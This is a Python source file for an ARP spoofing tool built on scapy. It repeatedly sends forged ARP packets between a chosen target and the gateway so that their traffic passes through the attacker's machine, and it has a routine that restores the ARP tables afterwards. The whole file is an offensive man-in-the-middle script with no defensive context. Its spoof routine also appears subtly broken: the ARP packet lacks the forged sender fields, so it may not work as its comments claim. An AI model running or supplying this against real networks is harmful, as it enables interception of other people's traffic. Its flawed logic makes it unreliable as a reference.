import scapy.all as scapy
from scapy.all import ARP, Ether, srp
import time
import threading
from getmac import get_mac_address

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, retries=3, timeout=2):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        self.is_spoofing = False
        self.spoof_thread = None
        self.retries = retries
        self.timeout = timeout
    

    def get_mac(self, ip):
        mac=None
        i=5
        while i>=0:
            arp_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip)
            answered_list,_=scapy.srp(arp_packet,timeout=1,verbose=False)
            for _,detail in answered_list:
                if detail.hwsrc:
                    mac=detail.hwsrc
                    print(f"{mac} found for {ip}")
                    return mac
                else:
                    continue
            i-=1
        return mac

    def spoof(self, target_ip, target_mac, spoof_ip):
        """Send spoofed ARP responses to redirect traffic."""
        spoof_mac = self.get_mac(spoof_ip)
        packet =scapy.Ether(dst=target_mac,src=spoof_mac)/scapy.ARP(pdst=target_ip)
        scapy.sendp(packet, verbose=False)
        print("ARP packet sent")
    def start_spoofing(self):
        """Start ARP spoofing in a separate thread."""
        if self.is_spoofing:
            print("Spoofing is already running.")
            return
        
        self.is_spoofing = True
        self.spoof_thread = threading.Thread(target=self._run_spoofing)
        self.spoof_thread.daemon = True  # The thread will exit when the main program exits
        self.spoof_thread.start()
        print(f"Started ARP spoofing between {self.target_ip} and {self.gateway_ip}")

    def _run_spoofing(self):
        """Continuously send spoofed ARP packets."""
        while self.is_spoofing:
            self.spoof(self.target_ip, self.target_mac, self.gateway_ip)
            self.spoof(self.gateway_ip, self.gateway_mac, self.target_ip)
            time.sleep(2)  # Send packets every 2 seconds

    def stop_spoofing(self):
        """Stop ARP spoofing and restore network configuration."""
        if not self.is_spoofing:
            print("Spoofing is not running.")
            return
        
        self.is_spoofing = False
        if self.spoof_thread:
            self.spoof_thread.join()  # Wait for the spoofing thread to end

        # Restore the network configuration
        self.restore(self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac)
        self.restore(self.gateway_ip, self.target_ip, self.gateway_mac, self.target_mac)
        print("Stopped ARP spoofing and restored network configuration.")

    def restore(self, destination_ip, source_ip, destination_mac, source_mac):
        """Restore original ARP table entry for a given IP address."""
        # Construct the packet with explicit Ethernet and ARP layers
        packet = scapy.Ether(dst=destination_mac, src=source_mac) / scapy.ARP(
            op=2,  # 'is-at' ARP response
            pdst=destination_ip,  # Target IP
            hwdst=destination_mac,  # Target MAC
            psrc=source_ip,  # Source IP (spoofed as the gateway IP)
            hwsrc=source_mac  # Source MAC (spoofed as the gateway MAC)
        )

        # Use sendp to send the raw packet at Layer 2, preventing the warning
        scapy.sendp(packet, count=4, verbose=False)
    def is_running(self):
        """Check if spoofing is active."""
        return self.is_spoofing
